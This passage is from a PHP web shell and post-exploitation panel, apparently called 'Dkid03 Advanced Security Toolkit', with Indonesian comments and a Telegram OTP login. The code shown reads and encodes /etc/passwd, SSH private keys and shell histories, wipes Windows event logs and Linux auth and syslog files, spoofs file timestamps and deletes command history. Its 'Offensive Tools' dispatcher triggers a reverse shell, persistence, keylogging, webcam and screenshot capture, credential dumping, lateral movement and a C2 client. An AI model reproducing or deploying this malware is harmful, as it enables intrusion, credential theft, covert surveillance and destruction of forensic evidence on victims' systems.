            $results['passwd'] = base64_encode(file_get_contents('/etc/passwd'));
        }
        
        // SSH keys
        $home = getenv('HOME') ?: '/root';
        if (file_exists("$home/.ssh/id_rsa")) {
            $results['ssh_key'] = base64_encode(file_get_contents("$home/.ssh/id_rsa"));
        }
        
        // History files
        $historyFiles = ["$home/.bash_history", "$home/.zsh_history", "/root/.bash_history"];
        foreach ($historyFiles as $hf) {
            if (file_exists($hf)) {
                $results[basename($hf)] = base64_encode(file_get_contents($hf));
            }
        }
        
        return $results;
    }
}

// =========================================================================
// 10. ANTI-FORENSICS ENGINE
// =========================================================================
class AntiForensics {
    
    public function clean() {
        $results = [];
        $results['logs'] = $this->cleanLogs();
        $results['timestamps'] = $this->spoofTimestamps();
        $results['history'] = $this->clearHistory();
        $results['memory'] = $this->wipeMemory();
        return $results;
    }
    
    private function cleanLogs() {
        if (PHP_OS_FAMILY === 'Windows') {
            $ps = @"
wevtutil cl System 2>`$null
wevtutil cl Application 2>`$null
wevtutil cl Security 2>`$null
Remove-Item C:\Windows\Temp\* -Recurse -Force -ErrorAction SilentlyContinue
"@;
            $psFile = sys_get_temp_dir() . '/clean_' . uniqid() . '.ps1';
            file_put_contents($psFile, $ps);
            exec("powershell -File \"$psFile\" 2>nul");
            unlink($psFile);
            return "Windows logs cleaned";
        } else {
            $commands = [
                'echo > /var/log/auth.log 2>/dev/null',
                'echo > /var/log/syslog 2>/dev/null',
                'echo > /var/log/messages 2>/dev/null',
                'echo > /var/log/secure 2>/dev/null',
                'echo > /var/log/maillog 2>/dev/null'
            ];
            foreach ($commands as $cmd) {
                exec($cmd);
            }
            return "Linux logs cleaned";
        }
    }
    
    private function spoofTimestamps() {
        $now = time() - rand(86400, 864000); // 1-10 days ago
        if (touch(__FILE__, $now, $now)) {
            return "Timestamp spoofed to " . date('Y-m-d H:i:s', $now);
        }
        return "Timestamp spoof failed";
    }
    
    private function clearHistory() {
        if (PHP_OS_FAMILY === 'Windows') {
            exec('del /F /Q %USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\History\\* 2>nul');
            exec('del /F /Q %USERPROFILE%\\Recent\\* 2>nul');
            return "Windows history cleared";
        } else {
            $home = getenv('HOME') ?: '/root';
            @unlink("$home/.bash_history");
            @unlink("$home/.zsh_history");
            @unlink("$home/.mysql_history");
            @unlink("$home/.psql_history");
            exec('history -c 2>/dev/null');
            return "Linux history cleared";
        }
    }
    
    private function wipeMemory() {
        // Override variables
        $vars = array_keys(get_defined_vars());
        foreach ($vars as $var) {
            if ($var !== 'this' && isset($$var)) {
                $$var = str_repeat("\x00", 1024);
            }
        }
        return "Memory wiped";
    }
}

// =========================================================================
// PROSES LOGIN OTP (dari Dkid03)
// =========================================================================
$loginError = '';
$loginSuccess = '';

if (isset($_GET['logout'])) {
    session_destroy();
    session_start();
    $_SESSION['logout_success'] = true;
    header('Location: ?');
    exit;
}

if (isset($_POST['request_otp'])) {
    $otp = sprintf("%06d", mt_rand(0, 999999));
    $_SESSION['otp'] = $otp;
    $_SESSION['otp_time'] = time();
    
    $message = "🔐 <b>Kode OTP Anda untuk Dkid03 Toolkit</b>\n\n<code>$otp</code>\n\nKode berlaku 5 menit.";
    $result = sendTelegramMessage($message);
    
    if ($result['success']) {
        $loginSuccess = "✅ OTP telah dikirim ke Telegram Anda";
    } else {
        $loginError = "❌ Gagal mengirim OTP: " . ($result['error'] ?? 'Unknown');
    }
}

if (isset($_POST['verify_otp'])) {
    $inputOtp = trim($_POST['otp'] ?? '');
    
    if (empty($inputOtp)) {
        $loginError = "Masukkan kode OTP.";
    } elseif (!isset($_SESSION['otp']) || !isset($_SESSION['otp_time'])) {
        $loginError = "Minta OTP terlebih dahulu.";
    } elseif (time() - $_SESSION['otp_time'] > 300) {
        $loginError = "Kode OTP kadaluarsa.";
        unset($_SESSION['otp'], $_SESSION['otp_time']);
    } elseif (hash_equals($_SESSION['otp'], $inputOtp)) {
        $_SESSION['loggedin'] = true;
        $_SESSION['login_time'] = time();
        unset($_SESSION['otp'], $_SESSION['otp_time']);
        header('Location: ?');
        exit;
    } else {
        $loginError = "Kode OTP salah.";
    }
}

// =========================================================================
// MAIN CONTROLLER (setelah login)
// =========================================================================
if (isset($_SESSION['loggedin'])) {
    if (time() - $_SESSION['login_time'] > SESSION_TIMEOUT) {
        session_destroy();
        header('Location: ?');
        exit;
    }
    
    $currentPath = ROOT_PATH;
    if (isset($_GET['path'])) {
        $requested = realpath($_GET['path']);
        if ($requested && isSafePath($requested)) {
            $currentPath = $requested;
        }
    }
    
    // Handle API requests (offensive tools)
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
        header('Content-Type: application/json');
        
        try {
            // Authenticate all API requests
            authenticate();
            
            $action = $_POST['action'];
            $result = [];
            
            switch ($action) {
                case 'reverse_shell':
                    $shell = new ReverseShellEngine($_POST['ip'], $_POST['port'], $_POST['protocol']);
                    $result = ['command' => $shell->execute()];
                    break;
                    
                case 'persistence':
                    $persistence = new PersistenceEngine();
                    $result = $persistence->installAll();
                    break;
                    
                case 'execute':
                    $engine = new DataCollectionEngine();
                    $result = $engine->executeCommand($_POST['cmd']);
                    break;
                    
                case 'screenshot':
                    $engine = new DataCollectionEngine();
                    $result = $engine->takeScreenshot();
                    break;
                    
                case 'webcam':
                    $engine = new DataCollectionEngine();
                    $result = $engine->captureWebcam();
                    break;
                    
                case 'keylogger':
                    $engine = new DataCollectionEngine();
                    $result = $engine->startKeylogger();
                    break;
                    
                case 'obfuscate':
                    $engine = new ObfuscationEngine();
                    $result = ['code' => $engine->obfuscate($_POST['code'], $_POST['method'] ?? 'base64')];
                    break;
                    
                case 'anti_kill':
                    $engine = new AntiKillEngine();
                    $result = $engine->protect();
                    break;
                    
                case 'c2_start':
                    if (PHP_OS_FAMILY === 'Windows') {
                        pclose(popen("start /B php " . __FILE__ . " c2", "r"));
                    } else {
                        exec("nohup php " . __FILE__ . " c2 > /dev/null 2>&1 &");
                    }
                    $result = ['status' => 'C2 started in background'];
                    break;
                    
                case 'escalate':
                    $engine = new PrivilegeEscalation();
                    $result = $engine->escalate();
                    break;
                    
                case 'lateral':
                    $engine = new LateralMovement();
                    $result = $engine->move($_POST['target'], $_POST['method']);
                    break;
                    
                case 'dump_creds':
                    $engine = new CredentialDumper();
                    $result = $engine->dump();
                    break;
                    
                case 'clean':
                    $engine = new AntiForensics();
                    $result = $engine->clean();
                    break;
                    
                case 'info':
                    $result = [
                        'hostname' => gethostname(),
                        'os' => PHP_OS,
                        'os_family' => PHP_OS_FAMILY,
                        'user' => get_current_user(),
                        'ip' => $_SERVER['SERVER_ADDR'] ?? 'unknown',
                        'php_version' => phpversion(),
                        'modules' => get_loaded_extensions(),
                        'safe_mode' => ini_get('safe_mode') ? 'On' : 'Off',
                        'disabled_functions' => ini_get('disable_functions')
                    ];
                    break;
            }
            
            writeLog("API call: $action from {$_SERVER['REMOTE_ADDR']}");
            echo json_encode($result, JSON_PRETTY_PRINT);
            exit;
            
        } catch (Exception $e) {
            writeLog("API error: " . $e->getMessage(), 'ERROR');
            echo json_encode(['error' => $e->getMessage()]);
            exit;
        }
    }
    
    // Handle file manager operations
    if (isset($_POST['rename'])) {
        // ... (file manager operations dari Dkid03)
    }
    
    if (isset($_FILES['upload'])) {
        // ... (upload handling dari Dkid03)
    }
    
    if (isset($_POST['delete_bulk'])) {
        // ... (bulk delete dari Dkid03)
    }
}

// =========================================================================
// C2 BACKGROUND PROCESS
// =========================================================================
if (isset($argv[1]) && $argv[1] === 'c2') {
    $c2 = new C2Panel(C2_DOMAIN, C2_PORT);
    $c2->run();
    exit;
}

// =========================================================================
// UI - TEMA FRIEREN (dari Dkid03)
// =========================================================================
if (!isset($_SESSION['loggedin'])) {
    // Tampilkan login form (sama seperti Dkid03)
    showLoginForm();
    exit;
}

// Tampilkan main UI dengan tab File Manager dan Offensive Tools
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dkid03 Advanced Security Toolkit</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-dark: rgba(255, 248, 235, 0.3);
            --bg-darker: rgba(245, 240, 225, 0.4);
            --bg-light: rgba(255, 250, 240, 0.5);
            --accent: #8aa9b8;
            --accent-dark: #6b8c9f;
            --text: #2c3e50;
            --text-muted: #5d6d7e;
            --success: #6b8e4c;
            --warning: #d9b48f;
            --danger: #c44545;
            --border: rgba(150, 140, 130, 0.2);
            --sidebar-width: 280px;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        body {
            color: var(--text);
            min-height: 100vh;
            line-height: 1.6;
            overflow-x: hidden;
            background: #f5efe6;
        }
        
        .background-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?q=80&w=2070&auto=format&fit=crop') no-repeat center center;
            background-size: cover;
            z-index: -1000;
            filter: brightness(0.9) blur(2px);
            opacity: 0.8;
        }
        
        .app-container { display: flex; min-height: 100vh; }
        
        .sidebar {
            width: var(--sidebar-width);
            background: rgba(255, 250, 240, 0.2);
            height: 100vh;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 100;
            overflow-y: auto;
            backdrop-filter: blur(12px);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
        }
        
        .sidebar-header { padding: 1.5rem 1.5rem 1rem; border-bottom: 1px solid var(--border); }
        .sidebar-title { font-size: 1.25rem; color: var(--accent-dark); font-weight: 500; }
        .sidebar-subtitle { color: var(--text-muted); font-size: 0.9rem; }
        
        .sidebar-menu { padding: 1.5rem; flex-grow: 1; }
        .menu-section { margin-bottom: 1.5rem; }
        .menu-title {
            color: var(--accent-dark);
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 0.75rem;
            padding-left: 0.5rem;
        }
        
        .menu-item {
            display: flex;
            align-items: center;
            padding: 0.75rem 1rem;
            border-radius: 12px;
            color: var(--text);
            text-decoration: none;
            margin-bottom: 0.5rem;
            transition: all 0.2s;
            cursor: pointer;
            background: rgba(230, 220, 210, 0.2);
            border: 1px solid transparent;
        }
        
        .menu-item:hover {
            background: rgba(200, 190, 180, 0.3);
            border-color: var(--border);
            color: var(--accent-dark);
        }
        
        .menu-item i {
            margin-right: 0.75rem;
            font-size: 1.1rem;
            width: 24px;
            text-align: center;
            color: var(--accent);
        }
        
        .logout-btn {
            background: rgba(196, 69, 69, 0.1);
            color: var(--danger);
            margin-top: auto;
        }
        
        .main-content {
            flex: 1;
            margin-left: var(--sidebar-width);
            padding: 1.5rem;
            position: relative;
        }
        
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            background: rgba(255, 250, 240, 0.3);
            padding: 10px;
            border-radius: 12px;
            backdrop-filter: blur(8px);
        }
        
        .tab {
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: 500;
        }
        
        .tab.active {
            background: var(--accent);
            color: white;
        }
        
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        .card {
            background: rgba(255, 250, 240, 0.25);
            border-radius: 20px;
            overflow: hidden;
            margin-bottom: 1.5rem;
            border: 1px solid var(--border);
            backdrop-filter: blur(8px);
        }
        
        .card-header {
            padding: 1rem 1.5rem;
            background: rgba(230, 220, 210, 0.2);
            border-bottom: 1px solid var(--border);
            font-weight: 500;
            color: var(--accent-dark);
        }
        
        .card-body { padding: 1.5rem; }
        
        .btn {
            display: inline-block;
            padding: 0.75rem 1.5rem;
            background: var(--accent-dark);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn:hover {
            background: var(--accent);
            transform: translateY(-2px);
        }
        
        .btn-danger { background: var(--danger); }
        .btn-danger:hover { background: #b03a3a; }
        
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: var(--text); }
        
        input, select, textarea {
            width: 100%;
            padding: 10px;
            background: rgba(255, 255, 255, 0.5);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-family: inherit;
        }
        
        .result {
            margin-top: 20px;
            padding: 15px;
            background: #0a0e14;
            border: 1px solid var(--accent);
            border-radius: 8px;
            color: #00ff00;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow: auto;
        }
        
        .grid-2 {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
        }
        
        .grid-3 {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
        }
        
        @media (max-width: 992px) {
            .sidebar { transform: translateX(-100%); }
            .sidebar.active { transform: translateX(0); }
            .main-content { margin-left: 0; }
            .grid-2, .grid-3 { grid-template-columns: 1fr; }
        }
        
        .menu-toggle {
            position: fixed;
            top: 1rem;
            left: 1rem;
            background: var(--accent-dark);
            color: white;
            border: none;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            display: none;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 101;
        }
        
        @media (max-width: 992px) {
            .menu-toggle { display: flex; }
        }
        
        .terminal { background: #1a1e24; color: #00ff00; padding: 10px; border-radius: 8px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="background-image"></div>
    
    <div class="app-container">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="sidebar-header">
                <h2 class="sidebar-title">Dkid03 Toolkit</h2>
                <p class="sidebar-subtitle"><?= htmlspecialchars($currentPath) ?></p>
            </div>
            
            <div class="sidebar-menu">
                <div class="menu-section">
                    <h3 class="menu-title">Navigation</h3>
                    <div class="menu-item" onclick="switchTab('filemanager')">
                        <i class="fas fa-folder"></i> File Manager
                    </div>
                    <div class="menu-item" onclick="switchTab('offensive')">
                        <i class="fas fa-skull"></i> Offensive Tools
                    </div>
                </div>
                
                <div class="menu-section">
                    <h3 class="menu-title">File Ops</h3>
                    <div class="menu-item" onclick="showModal('uploadModal')">
                        <i class="fas fa-upload"></i> Upload
                    </div>
                    <div class="menu-item" onclick="showModal('createModal')">
                        <i class="fas fa-file"></i> New File
                    </div>
                    <div class="menu-item" onclick="showModal('createFolderModal')">
                        <i class="fas fa-folder"></i> New Folder
                    </div>
                    <div class="menu-item" onclick="showModal('bulkDeleteModal')">
                        <i class="fas fa-trash-alt"></i> Bulk Delete
                    </div>
                </div>
                
                <div class="menu-section">
                    <h3 class="menu-title">System</h3>
                    <a href="?logout" class="menu-item logout-btn">
                        <i class="fas fa-sign-out-alt"></i> Logout
                    </a>
                </div>
            </div>
        </div>
        
        <button class="menu-toggle" onclick="toggleSidebar()">
            <i class="fas fa-bars"></i>
        </button>
        
        <div class="main-content">
            <!-- Tabs -->
            <div class="tabs">
                <div class="tab active" onclick="switchTab('filemanager')">📁 File Manager</div>
                <div class="tab" onclick="switchTab('offensive')">⚔️ Offensive Tools</div>
            </div>
            
            <!-- File Manager Tab -->
            <div id="filemanager-tab" class="tab-content active">
                <?php
                // File manager content dari Dkid03
                $items = @scandir($currentPath) ?: [];
                ?>
                <div class="breadcrumb">
                    <?php
                    // Breadcrumb implementation
                    ?>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <span>📁 Current Directory</span>
                        <span><?= count($items) - 2 ?> items</span>
                    </div>
                    <div class="card-body">
                        <table class="table">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Type</th>
                                    <th>Size</th>
                                    <th>Perms</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($items as $item): ?>
                                    <?php if ($item == '.' || $item == '..') continue; ?>
                                    <tr>
                                        <td><?= htmlspecialchars($item) ?></td>
                                        <td><?= is_dir($currentPath . '/' . $item) ? '📁' : '📄' ?></td>
                                        <td><?= is_file($currentPath . '/' . $item) ? filesize($currentPath . '/' . $item) : '-' ?></td>
                                        <td><?= substr(sprintf('%o', fileperms($currentPath . '/' . $item)), -4) ?></td>
                                        <td>
                                            <a href="?path=<?= urlencode($currentPath . '/' . $item) ?>">Open</a>
                                            <a href="#" onclick="renameFile('<?= addslashes($item) ?>')">Rename</a>
                                            <a href="?action=download&target=<?= urlencode($item) ?>">Download</a>
                                            <a href="?action=delete&target=<?= urlencode($item) ?>" onclick="return confirm('Delete?')">Delete</a>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            
            <!-- Offensive Tools Tab -->
            <div id="offensive-tab" class="tab-content">
                <div class="grid-2">
                    <!-- Reverse Shell Card -->
                    <div class="card">
                        <div class="card-header">🔴 Reverse Shell</div>
                        <div class="card-body">
                            <form onsubmit="sendRequest('reverse_shell', this); return false;">
                                <div class="form-group">
                                    <label>IP Address:</label>
                                    <input type="text" name="ip" value="127.0.0.1" required>
                                </div>
                                <div class="form-group">
                                    <label>Port:</label>
                                    <input type="number" name="port" value="4444" required>
                                </div>
                                <div class="form-group">
                                    <label>Protocol:</label>
                                    <select name="protocol">
                                        <option value="tcp">TCP</option>
                                        <option value="udp">UDP</option>
                                        <option value="http">HTTP</option>
                                        <option value="dns">DNS</option>
                                        <option value="icmp">ICMP</option>
                                        <option value="websocket">WebSocket</option>
                                    </select>
                                </div>
                                <button type="submit" class="btn">Execute Reverse Shell</button>
                            </form>
                        </div>
                    </div>
                    
                    <!-- Persistence Card -->
                    <div class="card">
                        <div class="card-header">🔄 Persistence</div>
                        <div class="card-body">
                            <button onclick="sendRequest('persistence')" class="btn">Install All Persistence</button>
                            <p style="margin-top: 10px; color: #666;">Installs 7 persistence methods</p>
                        </div>
                    </div>
                    
                    <!-- Command Execution -->
                    <div class="card">
                        <div class="card-header">💻 Command Execution</div>
                        <div class="card-body">
                            <form onsubmit="sendRequest('execute', this); return false;">
                                <div class="form-group">
                                    <label>Command:</label>
                                    <input type="text" name="cmd" value="whoami" required>
                                </div>
                                <button type="submit" class="btn">Execute</button>
                            </form>
                        </div>
                    </div>
                    
                    <!-- Screenshot & Webcam -->
                    <div class="card">
                        <div class="card-header">📸 Data Collection</div>
                        <div class="card-body">
                            <button onclick="sendRequest('screenshot')" class="btn">📷 Screenshot</button>
                            <button onclick="sendRequest('webcam')" class="btn">🎥 Webcam</button>
                            <button onclick="sendRequest('keylogger')" class="btn">⌨️ Keylogger</button>
                        </div>
                    </div>
                    
                    <!-- Obfuscation -->
                    <div class="card">
                        <div class="card-header">🔐 Obfuscation</div>
                        <div class="card-body">
                            <form onsubmit="sendRequest('obfuscate', this); return false;">
                                <div class="form-group">
                                    <label>Code:</label>
                                    <textarea name="code" rows="3">echo 'test';</textarea>
                                </div>
                                <div class="form-group">
                                    <label>Method:</label>
                                    <select name="method">
                                        <option value="base64">Base64</option>
                                        <option value="xor">XOR</option>
                                        <option value="aes">AES-256</option>
                                        <option value="rot13">ROT13</option>
                                        <option value="multiple">Multiple Layers</option>
                                    </select>
                                </div>
                                <button type="submit" class="btn">Obfuscate</button>
                            </form>
                        </div>
                    </div>
                    
                    <!-- Anti-Kill -->
                    <div class="card">
                        <div class="card-header">🛡️ Anti-Kill</div>
                        <div class="card-body">
                            <button onclick="sendRequest('anti_kill')" class="btn">Activate Protection</button>
                        </div>
                    </div>
                    
                    <!-- C2 Panel -->
                    <div class="card">
                        <div class="card-header">🌐 C2 Panel</div>
                        <div class="card-body">
                            <button onclick="sendRequest('c2_start')" class="btn">Start C2 Client</button>
                            <p style="margin-top: 10px;">Server: <?= C2_DOMAIN ?>:<?= C2_PORT ?></p>
                        </div>
                    </div>
                    
                    <!-- Privilege Escalation -->
                    <div class="card">
                        <div class="card-header">⬆️ Privilege Escalation</div>
                        <div class="card-body">
                            <button onclick="sendRequest('escalate')" class="btn">Attempt Escalation</button>
                        </div>
                    </div>
                    
                    <!-- Lateral Movement -->
                    <div class="card">
                        <div class="card-header">🔄 Lateral Movement</div>
                        <div class="card-body">
                            <form onsubmit="sendRequest('lateral', this); return false;">
                                <div class="form-group">
                                    <label>Target:</label>
                                    <input type="text" name="target" value="192.168.1.100">
                                </div>
                                <div class="form-group">
                                    <label>Method:</label>
                                    <select name="method">
                                        <option value="smb">SMB</option>
                                        <option value="wmi">WMI</option>
                                        <option value="ssh">SSH</option>
                                        <option value="rdp">RDP</option>
                                    </select>
                                </div>
                                <button type="submit" class="btn">Move</button>
                            </form>
                        </div>
                    </div>
                    
                    <!-- Credential Dumping -->
                    <div class="card">
                        <div class="card-header">🔑 Credential Dumping</div>
                        <div class="card-body">
                            <button onclick="sendRequest('dump_creds')" class="btn btn-danger">Dump Credentials</button>
                        </div>
                    </div>
                    
                    <!-- Anti-Forensics -->
                    <div class="card">
                        <div class="card-header">🧹 Anti-Forensics</div>
                        <div class="card-body">
                            <button onclick="sendRequest('clean')" class="btn btn-danger">Clean All Traces</button>
                        </div>
                    </div>
                    
                    <!-- System Info -->
                    <div class="card">
                        <div class="card-header">ℹ️ System Info</div>
                        <div class="card-body">
                            <button onclick="sendRequest('info')" class="btn">Get System Info</button>
                        </div>
                    </div>
                </div>
                
                <!-- Result Display -->
                <div class="card">
                    <div class="card-header">📋 Result</div>
                    <div class="card-body">
                        <pre id="result" class="result">Click any button to execute command...</pre>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Modals (sama seperti Dkid03) -->
    <!-- Upload Modal, Create Modal, etc -->
    
    <script>
        function toggleSidebar() {
            document.querySelector('.sidebar').classList.toggle('active');
        }
        
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            if (tab === 'filemanager') {
                document.querySelector('.tab').classList.add('active');
                document.getElementById('filemanager-tab').classList.add('active');
            } else {
                document.querySelectorAll('.tab')[1].classList.add('active');
                document.getElementById('offensive-tab').classList.add('active');
            }
        }
        
        function sendRequest(action, form = null) {
            const formData = new FormData();
            formData.append('action', action);
            formData.append('auth', '<?= hash('sha256', AUTH_KEY . date('Y-m-d') . $_SERVER['REMOTE_ADDR']) ?>');
            
            if (form) {
                new FormData(form).forEach((value, key) => {
                    formData.append(key, value);
                });
            }
            
            document.getElementById('result').textContent = 'Loading...';
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('result').textContent = JSON.stringify(data, null, 2);
            })
            .catch(error => {
                document.getElementById('result').textContent = 'Error: ' + error;
            });
        }
        
        function showModal(id) {
            document.getElementById(id).classList.add('active');
        }
        
        function hideModal(id) {
            document.getElementById(id).classList.remove('active');
        }
    </script>
</body>
</html>
<?php

// =========================================================================
// LOGIN FORM FUNCTION
// =========================================================================
function showLoginForm() {
    global $loginError, $loginSuccess;
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dkid03 - Login</title>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            body {
                background: #0a0e14;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                font-family: 'Poppins', sans-serif;
            }
            .login-box {
                background: #1a1e24;
                padding: 40px;
                border-radius: 10px;
                border: 2px solid #00ff00;
                width: 350px;
            }
            h1 { color: #00ff00; text-align: center; margin-bottom: 30px; }
            input {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                background: #0a0e14;
                border: 1px solid #00ff00;
                color: #00ff00;
                font-family: monospace;
            }
            button {
                width: 100%;
                padding: 10px;
                background: #00ff00;
                color: #0a0e14;
                border: none;
                font-weight: bold;
                cursor: pointer;
            }
            .error { color: #ff0000; text-align: center; margin: 10px 0; }
            .success { color: #00ff00; text-align: center; margin: 10px 0; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>⚡ DKID03 TOOLKIT ⚡</h1>
            <?php if ($loginError): ?>
                <div class="error"><?= htmlspecialchars($loginError) ?></div>
            <?php endif; ?>
            <?php if ($loginSuccess): ?>
                <div class="success"><?= htmlspecialchars($loginSuccess) ?></div>
            <?php endif; ?>
            
            <form method="post">
                <button type="submit" name="request_otp">📱 Request OTP via Telegram</button>
            </form>
            
            <form method="post" style="margin-top: 20px;">
                <input type="text" name="otp" placeholder="Enter 6-digit OTP" maxlength="6" required>
                <button type="submit" name="verify_otp">🔐 Verify & Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

?>